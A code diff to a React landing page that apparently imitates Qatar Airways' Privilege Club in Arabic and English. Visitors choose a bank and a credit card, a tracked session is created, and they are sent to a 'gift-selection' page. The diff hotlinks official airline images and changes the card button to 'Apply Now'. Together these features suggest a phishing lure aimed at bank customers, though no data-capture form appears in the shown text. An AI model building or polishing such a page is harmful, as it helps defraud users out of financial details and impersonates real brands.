@@ -3,7 +3,7 @@ import { useLocation } from "wouter";
 import { nanoid } from "nanoid";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
-import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown } from "lucide-react";
+import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown, Check } from "lucide-react";
 import Header from "@/components/Header";
 
 const bankImages = {
@@ -71,27 +71,16 @@ export default function Home() {
     localStorage.setItem("sessionId", sessionId);
     localStorage.setItem("selectedBank", selectedBank);
     
-    // إرسال البيانات وانتظارها لضمان وجود الجلسة في قاعدة البيانات قبل الانتقال
     try {
       await createSessionMutation.mutateAsync({
         sessionId,
         selectedBank,
         country: userCountry,
       });
-      // التوجيه بعد التأكد من إنشاء الجلسة
       setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
     } catch (err) {
       console.error("Session creation failed:", err);
-      // في حال الفشل، نحاول التوجيه على أي حال لعدم تعطيل المستخدم، ولكن نكون قد حاولنا الانتظار
       setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
-    }
-  };
-
-  const goToPersonalData = () => {
-    if (bankSelect !== "all") {
-      startSession(bankSelect);
-    } else {
-      alert(isArabic ? "يرجى اختيار البنك أولاً" : "Please select your bank first");
     }
   };
 
@@ -100,10 +89,6 @@ export default function Home() {
     setTimeout(() => {
       startSession(bank);
     }, 800);
-  };
-
-  const toggleLanguage = () => {
-    setLanguage(isArabic ? "en" : "ar");
   };
 
   const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);
@@ -123,54 +108,52 @@ export default function Home() {
         .dropdown-container { padding: 20px; text-align: center; }
         .dropdown-select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; background: white; }
 
-		        .cards-container { display: flex; flex-direction: column; align-items: center; gap: 20px; padding: 0 10px 20px 10px; }
-					        .qnb-card-box { background-color: #ffffff; border-radius: 20px; padding: 25px; margin: 0 auto; text-align: center; border: 1px solid #eeeeee; width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; cursor: pointer; transition: all 0.3s ease; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-                    .qnb-card-box.selected { border-color: #8C0032; border-width: 2px; box-shadow: 0 8px 25px rgba(140, 0, 50, 0.15); }
-                    .selection-badge { position: absolute; top: -10px; right: -10px; background: #8C0032; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 10; }
-		        .bank-logo { display: none; }
-				        .card-image-qnb { width: 100%; max-width: 300px; margin-bottom: 20px; border-radius: 0; }
-                .card-title-small { font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #8C0032; }
+        .cards-container { display: flex; flex-direction: column; align-items: center; gap: 20px; padding: 0 10px 20px 10px; }
+        .qnb-card-box { background-color: #ffffff; border-radius: 20px; padding: 25px; margin: 0 auto; text-align: center; border: 1px solid #eeeeee; width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; cursor: pointer; transition: all 0.3s ease; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .qnb-card-box.selected { border-color: #8C0032; border-width: 2px; box-shadow: 0 8px 25px rgba(140, 0, 50, 0.15); }
+        .selection-badge { position: absolute; top: -10px; right: -10px; background: #8C0032; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 10; }
+        .card-image-qnb { width: 100%; max-width: 300px; margin-bottom: 20px; border-radius: 0; }
+        .card-title-small { font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #8C0032; }
         .footer-image { width: 100%; display: block; margin-top: 20px; object-fit: cover; }
         
-	        /* أنماط المميزات الجديدة */
-	        .features-title { font-size: 11px; font-weight: bold; color: #8C0032; margin: 8px 0 6px 0; text-align: center; }
-	        .features-icons-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 4px; margin-bottom: 8px; width: 100%; }
-		        .feature-icon-item { display: flex; flex-direction: column; align-items: center; gap: 2px; padding: 4px; background: #f9f9f9; border-radius: 4px; border: 1px solid #e0e0e0; }
-		        .feature-icon-item svg { width: 14px; height: 14px; color: #8C0032; }
-		        .feature-icon-item span { font-size: 8px; color: #333; font-weight: 500; text-align: center; line-height: 1.1; }
-		        
-		        .features-bottom-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 4px; margin-bottom: 8px; width: 100%; }
-		        .feature-bottom-item { display: flex; flex-direction: column; align-items: center; gap: 2px; padding: 4px; background: #f9f9f9; border-radius: 4px; border: 1px solid #e0e0e0; }
-		        .feature-bottom-item svg { width: 14px; height: 14px; color: #8C0032; }
-		        .feature-bottom-item span { font-size: 8px; color: #333; font-weight: 500; text-align: center; line-height: 1.1; }
-	        
-		        .feature-large-item { background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 6px; border-radius: 4px; display: flex; align-items: center; gap: 6px; margin-bottom: 8px; width: 100%; box-sizing: border-box; }
-		        .feature-large-item svg { width: 16px; height: 16px; color: white; flex-shrink: 0; }
-		        .feature-large-item span { font-size: 9px; font-weight: 600; }
-	        
-	        .apply-btn { background-color: #8C0032; color: #ffffff; padding: 12px 0; width: 100%; max-width: 200px; border: none; border-radius: 20px; font-size: 14px; font-weight: bold; cursor: pointer; }
-            
-            /* أنماط قسم الأسباب الجديد */
-            .reasons-container { padding: 20px; background: #f7f7f7; margin: 20px; border-radius: 15px; border: none; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
-            .reasons-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 20px; text-align: center; }
-            .reason-item { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; direction: rtl; }
-            .reason-check { color: #22c55e; flex-shrink: 0; }
-            .reason-text { font-size: 14px; color: #4b5563; font-weight: 500; }
-            .reason-footer { font-size: 12px; color: #6b7280; margin-top: 20px; border-top: 1px solid #f3f4f6; padding-top: 10px; }
+        .features-title { font-size: 14px; font-weight: bold; color: #8C0032; margin: 8px 0 15px 0; text-align: center; }
+        .features-icons-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 15px; width: 100%; }
+        .feature-icon-item { display: flex; flex-direction: column; align-items: center; gap: 4px; padding: 8px; background: #f9f9f9; border-radius: 8px; border: 1px solid #e0e0e0; }
+        .feature-icon-item svg { width: 20px; height: 20px; color: #8C0032; }
+        .feature-icon-item span { font-size: 10px; color: #333; font-weight: 500; text-align: center; line-height: 1.2; }
+        
+        .features-bottom-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 15px; width: 100%; }
+        .feature-bottom-item { display: flex; flex-direction: column; align-items: center; gap: 4px; padding: 8px; background: #f9f9f9; border-radius: 8px; border: 1px solid #e0e0e0; }
+        .feature-bottom-item svg { width: 20px; height: 20px; color: #8C0032; }
+        .feature-bottom-item span { font-size: 10px; color: #333; font-weight: 500; text-align: center; line-height: 1.2; }
+        
+        .feature-large-item { background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 10px; border-radius: 8px; display: flex; align-items: center; gap: 10px; margin-bottom: 15px; width: 100%; box-sizing: border-box; }
+        .feature-large-item svg { width: 24px; height: 24px; color: white; flex-shrink: 0; }
+        .feature-large-item span { font-size: 12px; font-weight: 600; }
+        
+        .apply-btn { background-color: #8C0032; color: #ffffff; padding: 12px 0; width: 100%; max-width: 200px; border: none; border-radius: 20px; font-size: 14px; font-weight: bold; cursor: pointer; }
+        
+        .reasons-container { padding: 25px; background: #ffffff; margin: 20px; border-radius: 15px; border: none; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+        .reasons-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 25px; text-align: center; }
+        .reason-item { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; }
+        .reason-check { color: #22c55e; flex-shrink: 0; }
+        .reason-text { font-size: 15px; color: #4b5563; font-weight: 500; }
+        .reason-footer { font-size: 13px; color: #6b7280; margin-top: 25px; border-top: 1px solid #f3f4f6; padding-top: 15px; }
       `}</style>
       <Header />
       <div className="slider-container">
         <img
-          src="https://i.ibb.co/0RwDLqXq/h2-visa-cug-china.jpg"
+          src="https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/campaigns/global/privilege-club/enrollment/enrollment-hero-desktop.jpg"
           className={currentSlide === 0 ? "active" : ""}
           alt="Slide 1"
         />
         <img
-          src="https://i.ibb.co/mCKNbdgW/PHL.jpg"
+          src="https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/brand/global/destinations/qatar/doha/h1-skyline-doha-qatar-v2.jpg"
           className={currentSlide === 1 ? "active" : ""}
           alt="Slide 2"
         />
       </div>
+      
       <div className="reasons-container" dir={isArabic ? "rtl" : "ltr"}>
         <h2 className="reasons-title">{isArabic ? "أسباب رائعة للانضمام إلى نادي الامتياز" : "Great reasons to join Privilege Club"}</h2>
         <div className="reasons-list">
@@ -179,22 +162,21 @@ export default function Home() {
             { ar: "اربح وأنفق نقاط أفيوس كما تشاء", en: "Earn and spend Avios as you wish" },
             { ar: "اجمع نقاط أفيوس مع عائلتك", en: "Collect Avios with your family" },
             { ar: "ساعة مجاناً من الإنترنت على متن الطائرة", en: "One hour of free super Wi-Fi on board" },
-            { ar: "وفّر عند الدفع باستخدام Avios + cash", en: "Save when paying with Avios + cash" },
+            { ar: "وفّر عند الدفع باستخدام cash + Avios", en: "Save when paying with cash + Avios" },
             { ar: "تسوّق وادفع في السوق الحرة القطرية", en: "Shop and pay at Qatar Duty Free" },
             { ar: "استمتع برحلات المكافآت والترقيات", en: "Enjoy award flights and upgrades" },
             { ar: "احصل على وزن أمتعة إضافي", en: "Get extra baggage allowance" },
             { ar: "استمتع بخدمة الصالات حول العالم*", en: "Enjoy lounge access around the world*" }
           ].map((item, i) => (
-            <div key={i} className="reason-item" style={{ flexDirection: isArabic ? 'row' : 'row', justifyContent: 'flex-start' }}>
-              <span className="reason-check" style={{ marginLeft: isArabic ? '12px' : '0', marginRight: isArabic ? '0' : '12px' }}>✔</span>
+            <div key={i} className="reason-item">
+              <Check className="reason-check" size={18} />
               <span className="reason-text">{isArabic ? item.ar : item.en}</span>
             </div>
           ))}
         </div>
 
-        {/* المميزات الموحدة تحت أسباب الانضمام */}
-        <div className="unified-features" style={{ marginTop: '25px', borderTop: '1px solid #f3f4f6', paddingTop: '20px' }}>
-          <div className="features-title" style={{ fontSize: '14px', marginBottom: '15px' }}>{isArabic ? "المميزات الرئيسية للعضوية" : "Main Membership Features"}</div>
+        <div className="unified-features" style={{ marginTop: '30px', borderTop: '1px solid #f3f4f6', paddingTop: '25px' }}>
+          <div className="features-title">{isArabic ? "المميزات الرئيسية للعضوية" : "Main Membership Features"}</div>
           <div className="features-icons-grid">
             <div className="feature-icon-item">
               <Car />
@@ -258,14 +240,13 @@ export default function Home() {
             {selectedCard === idx && <div className="selection-badge">✔</div>}
             <span className="card-title-small">{isArabic ? (card as any).nameAr : (card as any).nameEn}</span>
             <img src={card.img} className="card-image-qnb" alt="Credit Card" />
-            <button className="apply-btn">
-              {isArabic ? "اختيار العضوية" : "Select Membership"}
-            </button>
+            <button className="apply-btn">{isArabic ? "قدم الآن" : "Apply Now"}</button>
           </div>
         ))}
       </div>
-      <div className="footer-image-container">
-        <img src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} className="footer-image-standard" alt="Footer" />
+      
+      <div className="footer-banner" style={{ textAlign: 'center', padding: '40px 20px', backgroundColor: '#ffffff', marginTop: '40px' }}>
+        <img src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} alt="Footer Banner" style={{ maxWidth: '100%', height: 'auto' }} />
       </div>
     </div>
   );
